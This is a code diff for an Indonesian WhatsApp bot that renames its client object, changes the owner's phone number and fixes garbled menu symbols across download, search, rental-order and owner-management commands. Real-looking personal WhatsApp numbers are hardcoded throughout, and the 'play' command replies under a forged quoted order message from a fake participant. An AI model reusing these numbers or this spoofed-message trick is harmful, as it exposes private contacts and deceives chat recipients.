‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎\n══✪〘 *👥 Tag All* 〙✪══\n`
 for (let mem of participants) {
-teks += `? @${mem.id.split('@')[0]}\n`
+teks += `➲ @${mem.id.split('@')[0]}\n`
 }
-BayMax.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
+baymax.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
 }
 break
 case 'ebinary': {
@@ -1763,13 +1763,13 @@ break
 case 'tiktokvideo':{
 if (!q) return reply(`Link Nya Kak???\nContoh ${prefix+command} https://vm.tiktok.com/ZSRApJY1K/`)
 let res = await tiktokdl(q)
-BayMax.sendMessage(m.chat,{video:{url: res.media[1].url},caption: `${mess.succes}`},{quoted:m})
+baymax.sendMessage(m.chat,{video:{url: res.media[1].url},caption: `${mess.succes}`},{quoted:m})
 }
 break
 case 'tiktokaudio':{
 if (!q) return reply(`Link Nya Kak???\nContoh ${prefix+command} https://vm.tiktok.com/ZSRApJY1K/`)
 let tytyd = await tiktokdl(q)
-BayMax.sendMessage(m.chat,{audio:{url: tytyd.media[2].url}, mimetype: "audio/mp4", ptt:false},{quoted:m})
+baymax.sendMessage(m.chat,{audio:{url: tytyd.media[2].url}, mimetype: "audio/mp4", ptt:false},{quoted:m})
 }
 break
 case 'googles': {
@@ -1778,9 +1778,9 @@ let google = require('google-it')
 google({'query': text}).then(res => {
 let teks = `Google Search From : ${text}\n\n`
 for (let g of res) {
-teks += `? *Title* : ${g.title}\n`
-teks += `? *Description* : ${g.snippet}\n`
-teks += `? *Link* : ${g.link}\n\n������������������������������������������������\n\n`
+teks += `⭔ *Title* : ${g.title}\n`
+teks += `⭔ *Description* : ${g.snippet}\n`
+teks += `⭔ *Link* : ${g.link}\n\n────────────────────────\n\n`
 } 
 reply(teks)
 })
@@ -1808,7 +1808,7 @@ Hasil : ${kay.hasil_nya}
 Tingkat Kesulitan : ${kay.tingkat_kesulitan}
 Bahan :
 ${kay.bahan_nya}`
-BayMax.sendMessage(m.chat,{
+baymax.sendMessage(m.chat,{
 image:{
 url:kay.thumb_nya},
 caption:dty,
@@ -1836,7 +1836,7 @@ rows: list_rows
 }],
 listType: 1
 }
-const sendMsg = await BayMax.sendMessage(from, buttonNya)
+const sendMsg = await baymax.sendMessage(from, buttonNya)
 break
 case 'play':{
 if (!text) return reply(`Example : ${prefix+command} story wa anime`)
@@ -1844,7 +1844,7 @@ let search = await yts(text)
 url = search.videos[0].url
 let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
 eek = await getBuffer(anu.thumbnail)
-owned = '6281390368580@s.whatsapp.net'
+owned = '6287705048235@s.whatsapp.net'
 ngen = `
 Title : ${anu.title}
 Ext : Search
@@ -1879,7 +1879,7 @@ contextInfo: {
 "sourceUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX'
 }}
 }
-BayMax.sendMessage(m.chat, buttonMessages, { quoted: {
+baymax.sendMessage(m.chat, buttonMessages, { quoted: {
 key: {
 fromMe: false,
 participant: `0@s.whatsapp.net`,
@@ -1890,7 +1890,7 @@ orderMessage: {
 itemCount: 99999999,
 status: 1,
 surface: 1,
-message: 'Created By BayMax',
+message: 'Created By baymax',
 orderTitle: '999999999', 
 sellerJid: `0@s.whatsapp.net` 
 }
@@ -1909,7 +1909,7 @@ downloadMp3(text)
 }
 break
 case 'donasi': case 'donate':{
-BayMax.sendMessage(from,{image:qrisdonate, caption:`Hai Kak @${sender.split("@")[0]} Mau ${command}?
+baymax.sendMessage(from,{image:qrisdonate, caption:`Hai Kak @${sender.split("@")[0]} Mau ${command}?
 
 Silahkan Scan Qris Di Atas Ya Kak
 Atau Juga Bisa Isi Nomor Payment Di Bawah Ya
@@ -1957,126 +1957,126 @@ footer: `Mau ${command} ya? Silahkan Pencet Di Bawah Ya Kak`,
 buttonText: 'SELECT',
 sections: seactiones,
 listType: 1}
-BayMax.sendMessage(from, listSw, { quoted: m })
+baymax.sendMessage(from, listSw, { quoted: m })
 }
 break
 case 'sewakay':
 if ((args[0]) == '1minggu'){
-reply(`Pesanan Kamu Sedang Di Proses Oleh , Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
-BayMax.sendMessage(creator,{text:`*? ORDER ?*
-? : *Paket:* 10K ? Sewabot 1 Minggu
+reply(`Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
+baymax.sendMessage(creator,{text:`*❏ ORDER ❏*
+📮 : *Paket:* 10K • Sewabot 1 Minggu
 - @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
 } else
 if ((args[0]) == '1bulan'){
-reply(`Pesanan Kamu Sedang Di Proses Oleh , Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
-BayMax.sendMessage(creator,{text:`*? ORDER ?*
-? : *Paket:* 20K ? Sewabot 1 Bulan
+reply(`Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
+baymax.sendMessage(creator,{text:`*❏ ORDER ❏*
+📮 : *Paket:* 20K • Sewabot 1 Bulan
 - @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
 } else
 if ((args[0]) == '1tahun'){
-reply(`Pesanan Kamu Sedang Di Proses Oleh , Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
-BayMax.sendMessage(creator,{text:`*? ORDER ?*
-? : *Paket:* 35K ? Sewabot 1 Tahun
+reply(`Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
+baymax.sendMessage(creator,{text:`*❏ ORDER ❏*
+📮 : *Paket:* 35K • Sewabot 1 Tahun
 - @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
 } else
 if ((args[0]) == 'permanent'){
-reply(`Pesanan Kamu Sedang Di Proses Oleh , Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
-BayMax.sendMessage(creator,{text:`*? ORDER ?*
-? : *Paket:* 45K ? Sewabot Permanent
+reply(`Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
+baymax.sendMessage(creator,{text:`*❏ ORDER ❏*
+📮 : *Paket:* 45K • Sewabot Permanent
 - @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
 }
 break
 case 'premkay':
 if ((args[0]) == '1minggu'){
-reply(`Pesanan Kamu Sedang Di Proses Oleh , Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
-BayMax.sendMessage(creator,{text:`*? ORDER ?*
-? : *Paket:* 10K ? Premium 1 Minggu
+reply(`Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
+baymax.sendMessage(creator,{text:`*❏ ORDER ❏*
+📮 : *Paket:* 10K • Premium 1 Minggu
 - @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
 } else
 if ((args[0]) == '1bulan'){
-reply(`Pesanan Kamu Sedang Di Proses Oleh , Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
-BayMax.sendMessage(creator,{text:`*? ORDER ?*
-? : *Paket:* 20K ? Premium 1 Bulan
+reply(`Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
+baymax.sendMessage(creator,{text:`*❏ ORDER ❏*
+📮 : *Paket:* 20K • Premium 1 Bulan
 - @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
 } else
 if ((args[0]) == '1tahun'){
-reply(`Pesanan Kamu Sedang Di Proses Oleh , Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
-BayMax.sendMessage(creator,{text:`*? ORDER ?*
-? : *Paket:* 35K ? Premium 1 Tahun
+reply(`Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
+baymax.sendMessage(creator,{text:`*❏ ORDER ❏*
+📮 : *Paket:* 35K • Premium 1 Tahun
 - @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
 } else
 if ((args[0]) == 'permanent'){
-reply(`Pesanan Kamu Sedang Di Proses Oleh , Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
-BayMax.sendMessage(creator,{text:`*? ORDER ?*
-? : *Paket:* 45K ? Premium Permanent
+reply(`Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
+baymax.sendMessage(creator,{text:`*❏ ORDER ❏*
+📮 : *Paket:* 45K • Premium Permanent
 - @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
 }
 break
 case 'botkay':
 if ((args[0]) == '1minggu'){
-reply(`Pesanan Kamu Sedang Di Proses Oleh , Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
-BayMax.sendMessage(creator,{text:`*? ORDER ?*
-? : *Paket:* 10K ? Jadibot 1 Minggu
+reply(`Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
+baymax.sendMessage(creator,{text:`*❏ ORDER ❏*
+📮 : *Paket:* 10K • Jadibot 1 Minggu
 - @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
 } else
 if ((args[0]) == '1bulan'){
-reply(`Pesanan Kamu Sedang Di Proses Oleh , Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
-BayMax.sendMessage(creator,{text:`*? ORDER ?*
-? : *Paket:* 20K ? Jadibot 1 Bulan
+reply(`Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
+baymax.sendMessage(creator,{text:`*❏ ORDER ❏*
+📮 : *Paket:* 20K • Jadibot 1 Bulan
 - @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
 } else
 if ((args[0]) == '1tahun'){
-reply(`Pesanan Kamu Sedang Di Proses Oleh , Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
-BayMax.sendMessage(creator,{text:`*? ORDER ?*
-? : *Paket:* 35K ? Jadibot 1 Tahun
+reply(`Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
+baymax.sendMessage(creator,{text:`*❏ ORDER ❏*
+📮 : *Paket:* 35K • Jadibot 1 Tahun
 - @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
 } else
 if ((args[0]) == 'permanent'){
-reply(`Pesanan Kamu Sedang Di Proses Oleh , Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
-BayMax.sendMessage(creator,{text:`*? ORDER ?*
-? : *Paket:* 45K ? Jadibot Permanent
+reply(`Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
+baymax.sendMessage(creator,{text:`*❏ ORDER ❏*
+📮 : *Paket:* 45K • Jadibot Permanent
 - @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
 }
 break
 case 'ownkay':
 if ((args[0]) == '1minggu'){
-reply(`Pesanan Kamu Sedang Di Proses Oleh , Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
-BayMax.sendMessage(creator,{text:`*? ORDER ?*
-? : *Paket:* 10K ? Jadi Owner 1 Minggu
+reply(`Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
+baymax.sendMessage(creator,{text:`*❏ ORDER ❏*
+📮 : *Paket:* 10K • Jadi Owner 1 Minggu
 - @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
 } else
 if ((args[0]) == '1bulan'){
-reply(`Pesanan Kamu Sedang Di Proses Oleh , Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
-BayMax.sendMessage(creator,{text:`*? ORDER ?*
-? : *Paket:* 20K ? Jadi Owner 1 Bulan
+reply(`Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
+baymax.sendMessage(creator,{text:`*❏ ORDER ❏*
+📮 : *Paket:* 20K • Jadi Owner 1 Bulan
 - @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
 } else
 if ((args[0]) == '1tahun'){
-reply(`Pesanan Kamu Sedang Di Proses Oleh , Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
-BayMax.sendMessage(creator,{text:`*? ORDER ?*
-? : *Paket:* 35K ? Jadi Owner 1 Tahun
+reply(`Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
+baymax.sendMessage(creator,{text:`*❏ ORDER ❏*
+📮 : *Paket:* 35K • Jadi Owner 1 Tahun
 - @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
 } else
 if ((args[0]) == 'permanent'){
-reply(`Pesanan Kamu Sedang Di Proses Oleh , Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
-BayMax.sendMessage(creator,{text:`*? ORDER ?*
-? : *Paket:* 45K ? Jadi Owner Permanent
+reply(`Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
+baymax.sendMessage(creator,{text:`*❏ ORDER ❏*
+📮 : *Paket:* 45K • Jadi Owner Permanent
 - @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
 }
 break
 case 'addprem':
-if (!itsByMax) return reply(mess.owner)
-if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281390368580`)
+if (!itsMeKayla) return reply(mess.owner)
+if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6287705048235`)
 prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
-let ceknya = await BayMax.onWhatsApp(prrkek)
+let ceknya = await baymax.onWhatsApp(prrkek)
 if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
 prem.push(prrkek)
 fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
 reply(`Nomor ${prrkek} Telah Menjadi Premium!`)
 break
 case 'delprem':
-if (!itsByMax) return reply(mess.owner)
-if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281390368580`)
+if (!itsMeKayla) return reply(mess.owner)
+if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6287705048235`)
 ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
 unp = prem.indexOf(ya)
 prem.splice(unp, 1)
@@ -2084,10 +2084,10 @@ fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
 reply(`Nomor ${ya} Telah Di Hapus Premium!`)
 break
 case 'addvn':{
-if (!itsByMax) return reply(mess.owner)
+if (!itsMeKayla) return reply(mess.owner)
 if (args.length < 1) return reply('Nama audionya apa')
 if (vnnye.includes(q)) return reply("Nama tersebut sudah di gunakan")
-let delb = await BayMax.downloadAndSaveMediaMessage(quoted)
+let delb = await baymax.downloadAndSaveMediaMessage(quoted)
 vnnye.push(q)
 await fsx.copy(delb, `./database/Audio/${q}.mp3`)
 fs.writeFileSync('./database/vnadd.json', JSON.stringify(vnnye))
@@ -2096,7 +2096,7 @@ reply(`Sukses Menambahkan Audio\nCek dengan cara ${prefix}listvn`)
 }
 break
 case 'delvn':{
-if (!itsByMax) return reply(mess.owner)
+if (!itsMeKayla) return reply(mess.owner)
 if (args.length < 1) return reply('Masukan query')
 if (!vnnye.includes(q)) return reply("Nama tersebut tidak ada di dalam data base")
 let wanu = vnnye.indexOf(q)
@@ -2107,27 +2107,27 @@ reply(`Sukses delete vn ${q}`)
 }
 break
 case 'listvn':{
-let teks = '������?�� *LIST VN* ��\n��\n'
+let teks = '┌──⭓「 *LIST VN* 」\n│\n'
 for (let x of vnnye) {
-teks += `��? ${x}\n`
+teks += `│⭔ ${x}\n`
 }
-teks += `��\n��������������������������?\n\n*Total ada : ${vnnye.length}*`
+teks += `│\n└────────────⭓\n\n*Total ada : ${vnnye.length}*`
 reply(teks)
 }
 break
 case 'addowner':
-if (!itsByMax) return reply(mess.owner)
-if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281390368580`)
+if (!itsMeKayla) return reply(mess.owner)
+if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6287705048235`)
 bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
-let ceknye = await BayMax.onWhatsApp(bnnd + `@s.whatsapp.net`)
+let ceknye = await baymax.onWhatsApp(bnnd + `@s.whatsapp.net`)
 if (ceknye.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
 owner.push(bnnd)
 fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
 reply(`Nomor ${bnnd} Telah Menjadi Owner!!!`)
 break
 case 'delowner':
-if (!itsByMax) return reply(mess.owner)
-if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281390368580`)
+if (!itsMeKayla) return reply(mess.owner)
+if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6287705048235`)
 ya = q.split("|")[0].replace(/[^0-9]/g, '')
 unp = owner.indexOf(ya)
 owner.splice(unp, 1)
@@ -2136,21 +2136,21 @@ reply(`Nomor ${ya} Telah Di Hapus Owner!!!`)
 break
 case 'listpremium':
 teks = '*List Premium*\n\n'
-for (let BayMax of prem) {
-teks += `- ${BayMax}\n`
+for (let baymax of prem) {
+teks += `- ${baymax}\n`
 }
 teks += `\n*Total : ${prem.length}*`
-BayMax.sendMessage(m.chat, { text: teks.trim() }, 'extendedTextMessage', { quoted: m, contextInfo: { "mentionedJid": prem } })
+baymax.sendMessage(m.chat, { text: teks.trim() }, 'extendedTextMessage', { quoted: m, contextInfo: { "mentionedJid": prem } })
 break
 case 'setppbot': {
-if (!itsByMax) return reply(mess.owner)
+if (!itsMeKayla) return reply(mess.owner)
 if (!quoted) return reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
 if (!/image/.test(mime)) return reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
 if (/webp/.test(mime)) return reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
-var medis = await BayMax.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
+var medis = await baymax.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
 if (args[0] == `/kay`) {
 var { img } = await generateProfilePicture(medis)
-await BayMax.query({
+await baymax.query({
 tag: 'iq',
 attrs: {
 to: botNumber,
@@ -2168,7 +2168,7 @@ content: img
 fs.unlinkSync(medis)
 reply(`Sukses`)
 } else {
-var memeg = await BayMax.updateProfilePicture(botNumber, { url: medis })
+var memeg = await baymax.updateProfilePicture(botNumber, { url: medis })
 fs.unlinkSync(medis)
 reply(`Sukses`)
 }
